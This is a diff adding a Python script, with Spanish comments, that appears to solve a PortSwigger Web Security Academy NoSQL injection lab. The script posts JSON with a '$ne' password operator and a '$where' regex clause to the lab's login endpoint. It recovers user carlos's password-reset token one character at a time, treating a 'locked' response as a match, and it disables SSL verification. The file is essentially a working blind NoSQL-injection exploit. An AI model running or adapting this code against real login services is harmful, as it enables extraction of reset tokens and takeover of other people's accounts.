@@ -1,0 +1,38 @@
+import requests
+import string
+import urllib3
+
+# Desactivar warnings de SSL
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# URL de la petición
+url = "https://ac18143b005702e40731d108003900a9.local.academy.dev.portswigger.com/login"
+
+# Definir el rango de variables
+range_var1 = range(0, 5)
+range_var2 = range(1, 21)
+characters = "qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHKLZXCVBMN"
+
+# Función para enviar la petición y verificar la respuesta
+def send_request_and_check(variable_1, variable_2, variable_3):
+    body = {
+        "username": "carlos",
+        "password": {"$ne": "invalid"},
+        "$where": f"this.passwordReset.match('^.{{{variable_2}}}{variable_3}.*')"
+    }
+    try:
+        response = requests.post(url, json=body, verify=False)
+        print(body)
+        # print(response.text)
+        if "locked" in response.text:
+            print(f"VARIABLE_1 en la posicion VARIABLE_2 es un {variable_3}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error during request: {e}")
+
+# Iterar sobre los valores de las variables y enviar las peticiones
+for var1 in range_var1:
+    for var2 in range_var2:
+        for var3 in characters:
+            send_request_and_check(var1, var2, var3)
+
+
